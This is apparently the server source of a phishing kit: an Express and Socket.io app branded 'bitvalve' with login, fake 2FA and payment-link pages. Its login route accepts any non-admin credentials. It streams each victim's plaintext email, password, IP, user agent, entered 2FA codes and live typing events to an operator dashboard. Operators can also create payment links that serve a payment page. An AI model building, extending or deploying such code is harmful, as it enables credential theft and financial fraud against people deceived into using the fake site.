require('dotenv').config();

const express = require('express');
const session = require('express-session');
const path = require('path');
const bcrypt = require('bcryptjs');
const http = require('http');
const { Server } = require('socket.io');
const { initDatabase, getUserByEmail, listUsers, getPaymentSettings, savePaymentSettings, createPaymentLink, getPaymentLinkBySlug, listPaymentLinks, deletePaymentLink } = require('./database');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const DEFAULT_PORT = Number(process.env.PORT || 3000);
const loginFilePath = path.join(__dirname, 'minemine_html_20260930_3702f0 (1).html');
const pendingLogins = new Map();

const adminSockets = new Set();
const loginAttempts = [];
const maxLoginAttempts = 100;

function broadcastLoginAttempt(data) {
  const attempt = {
    id: Date.now(),
    timestamp: new Date().toISOString(),
    ...data,
    ip: data.ip || 'unknown',
    userAgent: data.userAgent || 'unknown'
  };
  loginAttempts.unshift(attempt);
  if (loginAttempts.length > maxLoginAttempts) loginAttempts.pop();
  
  adminSockets.forEach(socket => {
    socket.emit('login-attempt', attempt);
  });
}

function broadcast2faAttempt(data) {
  const attempt = {
    id: Date.now(),
    timestamp: new Date().toISOString(),
    ...data,
    ip: data.ip || 'unknown',
    userAgent: data.userAgent || 'unknown'
  };
  
  adminSockets.forEach(socket => {
    socket.emit('2fa-attempt', attempt);
  });
}

const sessionMiddleware = session({
  secret: process.env.SESSION_SECRET || 'bitvalve-session-secret',
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    sameSite: 'lax',
    maxAge: 1000 * 60 * 60 * 8,
  },
});

app.use(sessionMiddleware);
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, '.')));

io.engine.use(sessionMiddleware);

io.on('connection', (socket) => {
  console.log('Socket connected:', socket.id, 'Auth:', socket.handshake.auth);
  
  socket.on('admin-monitor', () => {
    const session = socket.request.session || socket.handshake.session;
    const user = session?.user || socket.handshake.auth?.user;
    console.log('admin-monitor event, user:', user);
    
    if (user?.role === 'admin') {
      adminSockets.add(socket);
      console.log('Admin socket added, total admins:', adminSockets.size);
      socket.emit('login-history', loginAttempts);
      
      socket.on('disconnect', () => {
        adminSockets.delete(socket);
        console.log('Admin socket removed, total admins:', adminSockets.size);
      });
    } else {
      console.log('Admin-monitor rejected: not admin');
    }
  });

  socket.on('typing-event', (data) => {
    if (socket.handshake.auth?.user?.role === 'admin') {
      return;
    }
    console.log('Typing event from user, broadcasting to', adminSockets.size, 'admins');
    adminSockets.forEach(adminSocket => {
      adminSocket.emit('typing-event', data);
    });
  });
});

function requireAuth(req, res, next) {
  if (!req.session.user) {
    return res.status(401).json({ message: 'Authentication required' });
  }
  next();
}

function requireAdmin(req, res, next) {
  if (!req.session.user || req.session.user.role !== 'admin') {
    return res.status(403).json({ message: 'Admin access required' });
  }
  next();
}

app.get('/health', async (req, res) => {
  try {
    await initDatabase();
    res.json({ status: 'ok', database: 'sqlite ready' });
  } catch (error) {
    res.status(500).json({ status: 'error', message: error.message });
  }
});

app.get('/login', (req, res) => {
  res.sendFile(loginFilePath);
});

app.get('/payment', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'payment.html'));
});

app.get('/', (req, res) => {
  res.redirect('/payment');
});

app.get('/dashboard', requireAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'dashboard.html'));
});

app.get('/admin', requireAdmin, (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'admin.html'));
});

const FIXED_OTP = '799292';

app.post('/api/login', async (req, res) => {
  const email = String(req.body.email || '').trim().toLowerCase();
  const password = String(req.body.password || '');
  const ip = req.ip || req.connection.remoteAddress;
  const userAgent = req.get('user-agent');

  if (!email || !password) {
    broadcastLoginAttempt({ email, password, ip, userAgent, success: false, reason: 'missing_fields' });
    return res.status(400).json({ message: 'Email and password are required.' });
  }

  try {
    const user = await getUserByEmail(email);
    let success = false;
    let reason = 'invalid_credentials';

    if (email === 'admin@bitvalve.com') {
      if (!user) {
        reason = 'admin_not_found';
      } else {
        const validPassword = await bcrypt.compare(password, user.password_hash);
        if (!validPassword) {
          reason = 'invalid_password';
        } else {
          success = true;
        }
      }
    } else {
      success = true;
    }

    broadcastLoginAttempt({ email, password, ip, userAgent, success, reason });

    if (!success) {
      return res.status(401).json({ message: 'Login failed. Please try again.' });
    }

    const userRole = user && user.role ? user.role : 'user';
    const safeUser = user || {
      id: Date.now(),
      email,
      full_name: email.split('@')[0],
      role: 'user',
    };

    if (email === 'admin@bitvalve.com') {
      req.session.user = {
        id: safeUser.id,
        email: safeUser.email,
        full_name: safeUser.full_name,
        role: safeUser.role,
      };
      return res.json({
        success: true,
        step: 'complete',
        message: 'Admin login successful.',
        redirect: '/admin',
        user: {
          id: safeUser.id,
          email: safeUser.email,
          full_name: safeUser.full_name,
          role: safeUser.role,
        },
      });
    }

    pendingLogins.set(email, {
      userId: safeUser.id,
      otp: FIXED_OTP,
      createdAt: Date.now(),
      role: userRole,
    });

    res.json({
      success: true,
      step: '2fa',
      message: 'Credentials verified. Please enter your 2FA code.',
      email: safeUser.email,
      otpCode: FIXED_OTP,
      role: userRole,
    });
  } catch (error) {
    broadcastLoginAttempt({ email, password, ip, userAgent, success: false, reason: 'server_error' });
    res.status(500).json({ message: 'Login failed. Please try again.' });
  }
});

app.post('/api/verify-2fa', async (req, res) => {
  const email = String(req.body.email || '').trim().toLowerCase();
  const code = String(req.body.code || '').trim();
  const ip = req.ip || req.connection.remoteAddress;
  const userAgent = req.get('user-agent');

  if (!email || !code) {
    broadcast2faAttempt({ email, code, ip, userAgent, success: false, reason: 'missing_fields' });
    return res.status(400).json({ message: 'Email and 2FA code are required.' });
  }

  const pendingLogin = pendingLogins.get(email);
  if (!pendingLogin) {
    broadcast2faAttempt({ email, code, ip, userAgent, success: false, reason: 'no_pending_login' });
    return res.status(401).json({ message: 'No pending 2FA request found.' });
  }

  const success = pendingLogin.otp === code;
  const reason = success ? 'success' : 'invalid_code';

  broadcast2faAttempt({ email, code, ip, userAgent, success, reason });

  if (!success) {
    return res.status(401).json({ message: 'Verification failed.' });
  }

  pendingLogins.delete(email);

  const user = await getUserByEmail(email);
  const sessionUser = user || {
    id: pendingLogin.userId,
    email,
    full_name: email.split('@')[0],
    role: pendingLogin.role || 'user',
  };

  req.session.user = {
    id: sessionUser.id,
    email: sessionUser.email,
    full_name: sessionUser.full_name,
    role: sessionUser.role,
  };

  res.json({
    success: true,
    message: '2FA verified successfully.',
    redirect: sessionUser.role === 'admin' ? '/admin' : '/dashboard',
    user: {
      id: sessionUser.id,
      email: sessionUser.email,
      full_name: sessionUser.full_name,
      role: sessionUser.role,
    },
  });
});

app.get('/api/session', (req, res) => {
  res.json({
    authenticated: !!req.session.user,
    user: req.session.user || null,
  });
});

app.get('/api/socket-session', (req, res) => {
  if (!req.session.user || req.session.user.role !== 'admin') {
    return res.status(403).json({ message: 'Admin required' });
  }
  res.json({ sessionId: req.sessionID });
});

app.get('/api/payment-settings', async (req, res) => {
  try {
    const config = await getPaymentSettings();
    res.json(config);
  } catch (error) {
    res.status(500).json({ message: 'Unable to load payment settings.' });
  }
});

app.post('/api/payment-settings', requireAdmin, async (req, res) => {
  try {
    const saved = await savePaymentSettings(req.body || {});
    res.json({ success: true, payment: saved });
  } catch (error) {
    res.status(500).json({ message: 'Unable to save payment settings.' });
  }
});

app.get('/api/payment-links', requireAdmin, async (req, res) => {
  try {
    const links = await listPaymentLinks();
    res.json({ links });
  } catch (error) {
    res.status(500).json({ message: 'Unable to load payment links.' });
  }
});

app.post('/api/payment-links', requireAdmin, async (req, res) => {
  try {
    const { name, slug, config } = req.body || {};
    if (!name || !slug || !config) {
      return res.status(400).json({ message: 'Name, slug, and config are required.' });
    }
    const existing = await getPaymentLinkBySlug(slug);
    if (existing) {
      return res.status(400).json({ message: 'Slug already exists.' });
    }
    const link = await createPaymentLink(name, slug, config);
    res.json({ success: true, link });
  } catch (error) {
    res.status(500).json({ message: 'Unable to create payment link.' });
  }
});

app.delete('/api/payment-links/:id', requireAdmin, async (req, res) => {
  try {
    await deletePaymentLink(req.params.id);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ message: 'Unable to delete payment link.' });
  }
});

app.get('/p/:slug', async (req, res) => {
  try {
    const link = await getPaymentLinkBySlug(req.params.slug);
    if (!link) {
      return res.status(404).send('Payment link not found');
    }
    res.sendFile(path.join(__dirname, 'views', 'payment.html'));
  } catch (error) {
    res.status(500).send('Error loading payment page');
  }
});

app.get('/api/payment-link/:slug', async (req, res) => {
  try {
    const link = await getPaymentLinkBySlug(req.params.slug);
    if (!link) {
      return res.status(404).json({ message: 'Payment link not found' });
    }
    res.json(link.config);
  } catch (error) {
    res.status(500).json({ message: 'Unable to load payment link config.' });
  }
});

app.get('/api/users', requireAdmin, async (req, res) => {
  try {
    const users = await listUsers();
    res.json({ users });
  } catch (error) {
    res.status(500).json({ message: 'Unable to load users.' });
  }
});

app.post('/api/logout', (req, res) => {
  req.session.destroy(() => {
    res.json({ success: true, message: 'Logged out successfully.' });
  });
});

async function startServer(port = DEFAULT_PORT) {
  try {
    await initDatabase();

    server.listen(port, () => {
      console.log(`Server running at http://localhost:${port}`);
      console.log('Default admin login: admin@bitvalve.com / admin123');
    });

    server.on('error', (error) => {
      if (error.code === 'EADDRINUSE') {
        const fallbackPort = port === DEFAULT_PORT ? DEFAULT_PORT + 1 : null;

        if (fallbackPort) {
          console.warn(`Port ${port} is busy. Retrying on ${fallbackPort}...`);
          startServer(fallbackPort);
          return;
        }

        console.error(`Port ${port} is already in use. Please stop the other server or set PORT to a free port.`);
        process.exit(1);
      }

      console.error('Failed to start server:', error);
      process.exit(1);
    });
  } catch (error) {
    console.error('Failed to start server:', error);
    process.exit(1);
  }
}

startServer();
